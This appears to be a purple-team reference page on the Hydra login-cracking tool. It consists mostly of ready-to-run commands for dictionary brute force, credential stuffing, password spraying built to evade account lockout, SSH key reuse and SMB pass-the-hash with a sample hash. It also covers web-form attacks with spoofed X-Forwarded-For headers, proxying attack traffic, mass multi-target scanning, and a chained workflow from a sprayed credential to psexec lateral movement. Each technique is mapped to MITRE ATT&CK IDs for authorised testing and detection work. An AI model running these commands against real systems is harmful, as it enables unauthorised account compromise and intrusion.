# Hydra — Hands-On Use Cases

## Contents
- [Single-Target Dictionary Brute Force](#single-target-dictionary-brute-force)
- [Credential Stuffing — Known-Pair Lists](#credential-stuffing--known-pair-lists)
- [Password Spraying — One Password, Many Accounts](#password-spraying--one-password-many-accounts)
- [Login-Derived Guessing (`-e`)](#login-derived-guessing--e)
- [Pure Brute-Force Password Generation (`-x`)](#pure-brute-force-password-generation--x)
- [SSH — Password and Private-Key Brute Force](#ssh--password-and-private-key-brute-force)
- [RDP Credential Validation](#rdp-credential-validation)
- [SMB / SMB2 Credential Validation, Including Hash-Based Auth](#smb--smb2-credential-validation-including-hash-based-auth)
- [HTTP(S) Basic/Digest Auth](#https-basicdigest-auth)
- [HTTP(S) Form-Based (Web Login Page) Brute Force](#https-form-based-web-login-page-brute-force)
- [FTP and Classic Service Brute Force](#ftp-and-classic-service-brute-force)
- [Database Service Brute Force](#database-service-brute-force)
- [Threading and Timing Tuning](#threading-and-timing-tuning)
- [Stop-on-Success Conditions](#stop-on-success-conditions)
- [Splitting a Job Across Multiple Instances](#splitting-a-job-across-multiple-instances)
- [Multi-Target Mass Scanning from a List](#multi-target-mass-scanning-from-a-list)
- [Proxying Attack Traffic](#proxying-attack-traffic)
- [Resuming an Aborted Session](#resuming-an-aborted-session)
- [Chained Workflow — From Hydra Hit to Authenticated Access](#chained-workflow--from-hydra-hit-to-authenticated-access)

---

## Single-Target Dictionary Brute Force

The baseline case: one login (or list), one password list, one target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5
# or the old-style syntax (required if targets come from a file, see below):
hydra -l admin -P rockyou.txt 10.10.10.5 ssh
```

Full combinatorial mode against a list of both:

```bash
hydra -L users.txt -P passwords.txt ftp://10.10.10.5
```

**MITRE ATT&CK:** T1110.001 (Brute Force: Password Guessing) for a single-login/wordlist run; T1110.002 (Password Cracking) is not applicable here — Hydra validates against a live service, it does not crack an offline hash.

## Credential Stuffing — Known-Pair Lists

`-C` takes a colon-separated `login:pass` file — the mode for testing previously-breached or default-account credential pairs rather than a full cartesian product. Cannot be combined with `-l`/`-L`/`-p`/`-P` (verified in source: this combination is explicitly rejected), but can be combined with `-e`.

```bash
hydra -C known_breached_pairs.txt smb://10.10.10.0/24
```

**MITRE ATT&CK:** T1110.004 (Brute Force: Credential Stuffing).

## Password Spraying — One Password, Many Accounts

This is the mode built specifically to dodge per-account lockout policies: instead of hammering one account with many passwords (which trips a lockout threshold fast), try one or a small handful of passwords against **every** account, so no single account ever accumulates enough failures to lock. The mechanical key is `-u` (loop through logins in the outer loop, passwords in the inner loop) combined with a short password list or `-e`.

```bash
# Spray a single seasonal password against a large user list, one attempt
# per account before moving to the next password -- -u is the switch that
# makes this a spray rather than a per-account brute force
hydra -L users.txt -p 'Summer2026!' -u smb://10.10.10.5

# -e s: try each login as its own password (a very common weak-password
# pattern) across the whole user list, spray-style
hydra -L users.txt -e s -u rdp://10.10.10.5

# -C in "one password against many users" shape -- functionally a spray
# when every line shares the same password field
hydra -C spray_pairs.txt -u ssh://10.10.10.5
```

`-u` is automatically implied when `-x` (BFG generation) is used, since brute-force-generated candidates are conventionally cycled per-login as well.

**MITRE ATT&CK:** T1110.003 (Brute Force: Password Spraying).

## Login-Derived Guessing (`-e`)

A cheap, low-noise first pass before committing to a full wordlist — derive guesses directly from the login name itself rather than a separate password list. `-e` takes any combination of `n` (empty password), `s` (login used as its own password), `r` (reversed login as password).

```bash
hydra -L users.txt -e nsr ssh://10.10.10.5
```

**MITRE ATT&CK:** T1110.001 (Password Guessing) — this is a targeted-guess variant, not a spray or dictionary run.

## Pure Brute-Force Password Generation (`-x`)

No wordlist at all — Hydra's built-in BFG engine (Jan Dlabal) generates every candidate password for a given length range and character set on the fly. Genuinely expensive against anything but a short length range or narrow charset; realistically used against short PINs, default-pattern passwords, or a known partial policy.

```bash
# All 4-digit numeric PINs (e.g. an admin console or embedded-device login)
hydra -l admin -x 4:4:1 rdp://10.10.10.5

# 5-8 character lowercase+digit combinations, non-random ordering
hydra -l admin -x 5:8:aA1 -r ftp://10.10.10.5
```

**MITRE ATT&CK:** T1110.001 (Password Guessing).

## SSH — Password and Private-Key Brute Force

Standard password brute force against `ssh`:

```bash
hydra -L users.txt -P passwords.txt ssh://10.10.10.5
```

The `sshkey` module changes the meaning of `-p`/`-P` entirely — instead of password text, they must point to an **unencrypted PEM private key file** (`-p`) or a file listing paths to multiple candidate keys (`-P`), per the module's own usage text. This is the mechanism for testing whether a stolen/found private key (or a directory of them, e.g. recovered from another compromised host) grants SSH access to a target:

```bash
hydra -l root -P candidate_keys.txt sshkey://10.10.10.5
```

**MITRE ATT&CK:** T1110.001 (Password Guessing) for standard password auth; the `sshkey` variant is closer to T1552 (Unsecured Credentials)-sourced key reuse being validated via T1110-style automated attempts — tag both if the key material itself was harvested elsewhere.

## RDP Credential Validation

```bash
hydra -L users.txt -P passwords.txt rdp://10.10.10.5
# Optional Windows domain name as the module's one special option:
hydra -L users.txt -P passwords.txt rdp://10.10.10.5/CORP
```

**A real, current-source limitation worth knowing before relying on this:** Hydra's `rdp` module usage text states plainly that it can only validate credentials against targets that **enforce NLA/CredSSP**. A target without NLA enforced (older Windows with NLA disabled, or non-Windows RDP servers like xrdp) defers authentication to an in-session login screen Hydra's module cannot drive — those targets are reported as **not verifiable**, not brute-forced. Don't assume an RDP-brute-force attempt against a non-NLA target silently failed for a credential reason; it may not have been attempted at the protocol level at all.

**MITRE ATT&CK:** T1110.001/T1110.003 (Password Guessing / Password Spraying, depending on mode) against T1021.001 (Remote Desktop Protocol)'s authentication surface.

## SMB / SMB2 Credential Validation, Including Hash-Based Auth

```bash
# Basic password validation, local and domain accounts both tried by default
hydra smb://10.10.10.5 -l administrator -p 'Summer2026!'

# Explicitly scope to local accounts only, and force LMv2
hydra smb://10.10.10.5 -l administrator -p 'Summer2026!' -m "local lmv2"

# NTLM hash-based auth (pass-the-hash style) -- LM:NT hash pair as -p, "hash" keyword in -m
hydra smb://10.10.10.5 -l administrator \
  -p 'D5731CFC6C2A069C21FD0D49CAEBC9EA:2126EE7712D37E265FD63F2C84D2B13D:::' \
  -m "local hash"

# Target a specific trusted domain
hydra smb://10.10.10.5 -l jsmith -p 'Summer2026!' -m "other_domain:CORP"
```

**MITRE ATT&CK:** T1110.001/T1110.003 against T1021.002 (SMB/Windows Admin Shares)'s authentication surface; the NTLM-hash form overlaps T1550.002 (Use Alternate Authentication Material: Pass the Hash) in intent, though mechanically it's still Hydra performing a live, repeated NTLM handshake rather than a one-shot authenticated session the way `Impacket/`'s tools do.

## HTTP(S) Basic/Digest Auth

```bash
hydra -L users.txt -P passwords.txt https-get://portal.corp.local/admin/
```

**MITRE ATT&CK:** T1110.001/T1110.003 against a web application's authentication surface (no dedicated sub-technique for HTTP auth specifically — tag the underlying T1110 sub-technique that matches the attack shape used).

## HTTP(S) Form-Based (Web Login Page) Brute Force

The most operator-error-prone module — it requires knowing the target form's exact POST field names and a real success/failure condition string pulled from the live application (`-d` shows the raw sent/received data for building this). Syntax is `<url>:<form-params>:<condition>`, with `^USER^`/`^PASS^` (or `^USER64^`/`^PASS64^` for base64-encoded fields) as placeholders:

```bash
hydra -L users.txt -P passwords.txt https-post-form://portal.corp.local/login.php:"user=^USER^&pass=^PASS^:F=incorrect password"

# Success-condition instead of failure-condition (mutually exclusive -- only one of S=/F= at a time)
hydra -l admin -P passwords.txt http-post-form://10.10.10.5/login:"username=^USER^&password=^PASS^:S=Location: /dashboard"

# Custom header injection, including a random-IP header per attempt --
# useful for probing whether a target's rate-limiting trusts X-Forwarded-For
hydra -l admin -P passwords.txt http-post-form://10.10.10.5/login:"username=^USER^&password=^PASS^:F=failed:h=X-Forwarded-For\: ^RAND_IP^"
```

**MITRE ATT&CK:** T1110.001/T1110.003/T1110.004 depending on mode, against a web application login form.

## FTP and Classic Service Brute Force

```bash
hydra -L users.txt -P passwords.txt ftp://10.10.10.5
hydra -L users.txt -P passwords.txt pop3://10.10.10.5
hydra -L users.txt -P passwords.txt smtp://10.10.10.5
hydra -L users.txt -P passwords.txt telnet://10.10.10.5
```

The README itself flags Telnet as unreliable for detecting a genuinely correct vs. false login attempt (no clean protocol-level success/fail signal the way authenticated services have) — treat Telnet results with more skepticism than other modules.

**MITRE ATT&CK:** T1110.001/T1110.003/T1110.004 depending on mode.

## Database Service Brute Force

```bash
hydra -l sa -P passwords.txt mssql://10.10.10.5
hydra -l root -P passwords.txt mysql://10.10.10.5
hydra -l postgres -P passwords.txt postgres://10.10.10.5
hydra -P passwords.txt redis://10.10.10.5
```

**MITRE ATT&CK:** T1110.001/T1110.003 against direct database-service authentication (a common finding when a database port is exposed beyond its application tier).

## Threading and Timing Tuning

Speed (`-t`/`-T`) trades directly against detectability and against the target's own stability — the README notes too-high a task count "disables the service" on fragile targets.

```bash
# Fast: 64 parallel connections against one target (near the practical cap)
hydra -L users.txt -P passwords.txt -t 64 ssh://10.10.10.5

# Slow/stealthy: fully serialized, 10-second gap enforced across ALL threads
# per attempt -- -c forces -t 1 regardless of what -t is otherwise set to
hydra -L users.txt -P passwords.txt -c 10 ssh://10.10.10.5

# Wait longer for slow/high-latency responses, and space out connects per thread
hydra -L users.txt -P passwords.txt -t 4 -w 30 -W 5 rdp://10.10.10.5
```

**MITRE ATT&CK:** T1110 (parent) — timing tuning is a detection-evasion modifier on whichever specific T1110.x mode is in use, not a technique of its own.

## Stop-on-Success Conditions

```bash
# Stop attacking THIS target the instant one valid pair is found (per-host, useful with -M)
hydra -L users.txt -P passwords.txt -f -M targets.txt ssh

# Stop the ENTIRE run globally the instant any target/pair succeeds
hydra -L users.txt -P passwords.txt -F -M targets.txt ssh
```

## Splitting a Job Across Multiple Instances

`-D XofY` divides the wordlist into `Y` equal segments and runs only segment `X` — for horizontally splitting one large job across multiple hosts/processes running in parallel.

```bash
# Run on host 1 of 3:
hydra -L users.txt -P big_wordlist.txt -D 1of3 ssh://10.10.10.5
# Run on host 2 of 3 (simultaneously, on a different machine):
hydra -L users.txt -P big_wordlist.txt -D 2of3 ssh://10.10.10.5
```

## Multi-Target Mass Scanning from a List

```bash
# targets.txt: one host per line, optional ":port" override per line
hydra -L users.txt -P passwords.txt -M targets.txt -T 64 -K ssh
```

`-K` skips retrying hosts that previously errored out (dead/unreachable), which matters at scale — without it, a large `-M` run keeps re-wasting time on hosts that will never answer. `-T` here caps **total** parallel connections across the whole target list (separate from `-t`, which is per-target).

**MITRE ATT&CK:** T1110.003 (Password Spraying) is the typical intent when combined with `-u`/`-e` across a target list — the fleet-wide version of the single-target spray above.

## Proxying Attack Traffic

Environment-variable driven, not a command-line flag — set before invoking Hydra:

```bash
# HTTP-family modules only, through a corporate/anonymizing web proxy
export HYDRA_PROXY_HTTP="http://127.0.0.1:8080/"
hydra -L users.txt -P passwords.txt https-post-form://target/login:"..."

# All other modules, through a SOCKS5 proxy (e.g. a pivot/Tor-style relay)
export HYDRA_PROXY="socks5://127.0.0.1:1080"
hydra -L users.txt -P passwords.txt ssh://10.10.10.5

# Round-robin across a list of proxies -- point the variable at a file instead
export HYDRA_PROXY="proxylist.txt"
```

**MITRE ATT&CK:** T1090 (Proxy) as the supporting technique for whichever T1110.x brute-force mode is layered on top.

## Resuming an Aborted Session

```bash
# Original run gets interrupted (Ctrl-C, crash, killed):
hydra -L users.txt -P big_wordlist.txt -t 16 ssh://10.10.10.5
# ^C

# Resume exactly where it left off, from ./hydra.restore in the same directory:
hydra -R

# Skip the ~10-second "restore file found" pause and just proceed:
hydra -I -R
```

Must be run from the **same working directory** the original invocation used, on the **same platform/architecture/endianness** — `hydra -R` will refuse a restore file written elsewhere. See `03 - Source Evidence.md` for the forensic read of this file.

## Chained Workflow — From Hydra Hit to Authenticated Access

Hydra's own job ends the moment it reports a valid pair — it has no built-in follow-on execution capability. The realistic operator workflow feeds a confirmed credential straight into an already-built tool in this repo for the actual access:

```bash
# 1. Spray for a working credential against a subnet's SMB service
hydra -L users.txt -p 'Summer2026!' -u smb://10.10.10.0/24
# ... Hydra reports: [445][smb] host: 10.10.10.12   login: jsmith   password: Summer2026!

# 2. Validate the same credential at scale across the rest of the environment
# with NetExec (see Purple Teaming/NetExec/02 - Hands-On Use Cases.md)
nxc smb targets.txt -u jsmith -p 'Summer2026!'

# 3. Pivot to interactive/authenticated access with Impacket
# (see Purple Teaming/Impacket/psexec/02 - Hands-On Use Cases.md)
psexec.py 'CORP/jsmith:Summer2026!@10.10.10.12'
```

**MITRE ATT&CK:** T1110.003 (Password Spraying) for the Hydra/NetExec discovery-and-validation stage, handing off into T1021.002 (Remote Services: SMB/Windows Admin Shares) for the `psexec.py` follow-on — the credential-guessing and lateral-movement techniques are distinct ATT&CK entries even though this is one continuous operator workflow.
